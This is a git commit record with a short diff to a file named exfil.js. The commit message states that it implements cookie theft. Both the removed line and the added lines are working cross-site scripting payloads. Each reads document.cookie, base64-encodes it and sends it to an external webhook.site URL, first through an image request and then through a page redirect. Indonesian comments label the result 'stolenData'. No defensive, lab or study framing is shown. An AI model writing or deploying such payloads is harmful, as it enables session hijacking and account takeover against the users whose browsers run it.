cc2457e77f6331ef2a1a655d5af43360b37d6357
Fauzi Ismail <mailvelous.career@gmail.com>
2026-01-01 06:52:03 +0700

    Implement cookie theft and redirect to webhook
    Capture and encode document cookies, then redirect to a webhook with the data.

--- exfil.js
+++ exfil.js
@@ -1,2 +1,5 @@
-x = new Image(); x.src = 'https://webhook.site/b74e2458-abe5-41bf-8319-55fe0e931aeb?
-data='+btoa(document.cookie);
+// Ambil cookie dan encode ke base64 biar aman di URL
+var stolenData = btoa(document.cookie);
+
+// Redirect user ke webhook Anda dengan membawa data
+window.location.href = "https://webhook.site/b74e2458-abe5-41bf-8319-55fe0e931aeb?c=" + stolenData;
